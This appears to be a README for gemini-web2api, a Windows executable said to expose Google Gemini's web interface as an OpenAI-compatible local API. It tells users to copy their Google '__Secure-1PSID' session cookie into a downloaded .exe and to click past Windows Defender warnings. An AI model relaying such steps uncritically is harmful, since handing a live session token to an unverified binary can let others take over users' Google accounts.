# 🤖 gemini-web2api - Use Gemini as an OpenAI API

[![](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Walthera781/gemini-web2api/releases)

This software allows you to connect your applications to Google Gemini. It acts as a bridge. It takes requests meant for OpenAI and sends them to the Gemini web interface. You get the benefits of Gemini without changing your existing tools. It works as a single program. You do not need to install complex language environments or databases.

## 📥 Getting the Software

You need to download the program files from the official releases page. 

[Visit this page to download](https://github.com/Walthera781/gemini-web2api/releases)

Look for the file that ends in .exe. This is the version for Windows users. Save this file to a folder on your computer. A folder like "Documents" or "Downloads" works well. Remember where you put this file. You will need to find it again in the next step.

## ⚙️ Setting Up Your Environment

This software mimics the OpenAI interface. To make it work, you need your Google session data. 

1. Open your web browser. 
2. Go to the Gemini website.
3. Log in to your Google account.
4. Open the developer tools in your browser. You can usually do this by pressing the F12 key.
5. Look for the "Application" or "Storage" tab.
6. Find the "Cookies" section.
7. Locate the cookie named "__Secure-1PSID".
8. Copy the value of this cookie. 

You will use this value to connect the software to your account.

## 🚀 Running the Program

Follow these steps to start the software:

1. Open the folder where you saved the .exe file.
2. Hold the Shift key and right-click on an empty space inside the folder.
3. Choose the option that says "Open PowerShell window here" or "Open in Terminal".
4. Type the following command and press Enter:

`.\gemini-web2api.exe`

The first time you run the program, it may ask you for your session cookie. Paste the string you copied from your browser. The program will save this information so you do not need to enter it again.

Once the program runs, you will see a message saying that the server started. It usually runs on a local address, such as http://localhost:8080. Keep this window open while you use your other applications. If you close the window, the bridge stops working.

## 🛠️ Configuring Your Apps

Now that the software is running, you can connect your other apps. 

1. Open the app you want to use with Gemini.
2. Go to the settings or configuration area of that app.
3. Look for the API settings.
4. Set the API Base URL to the address shown in your terminal window. This looks like http://localhost:8080/v1.
5. Enter any text as the API key if the app requires one. The software ignores this key but needs a value to pass the check.
6. Select the model name you want to use. Most apps allow you to type the name manually if it does not appear in a dropdown menu.

## 📝 Troubleshooting Common Issues

If the software does not connect, check the following items:

*   **Cookie Expiry:** Google changes session cookies from time to time. If you see errors, repeat the steps in the setup section to get a new cookie value.
*   **Port Conflicts:** If you see an error saying the port is in use, another program is likely using port 8080. You can change the port by adding a command line flag. Type `.\gemini-web2api.exe -port 9000` to use a different port.
*   **Windows Defender:** Windows might show a warning when you run a new program. Click "More info" and then "Run anyway" if you trust the source.
*   **Internet Connection:** The software needs an active internet connection to communicate with Google servers. Ensure your firewall allows the program to send data.

## 💻 System Requirements

*   Operating System: Windows 10 or Windows 11.
*   Memory: At least 256MB of free RAM.
*   Disk Space: Less than 50MB of free space.
*   Browser: Any modern browser like Chrome, Edge, or Firefox.

## 🛡️ Privacy and Safety

The software runs locally on your machine. Your session cookies stay on your computer. The program only uses them to make requests to the Gemini service on your behalf. It does not send your data to any third-party servers other than Google. You maintain control over your own account. Always keep your session cookie secret and do not share it with others. If you believe your cookie was exposed, log out of Gemini in your browser. This will invalidate the old cookie and protect your account.

Keywords: 9router, ai-agent, ai-proxy, gemini, gemini-api, gemini-api-key, gemini-proxy, go, go-port, golang, google-gemini, llm, llm-proxy, multimodal, openai-api, openai-codex, openai-compatible, proxy, rewrite, web2api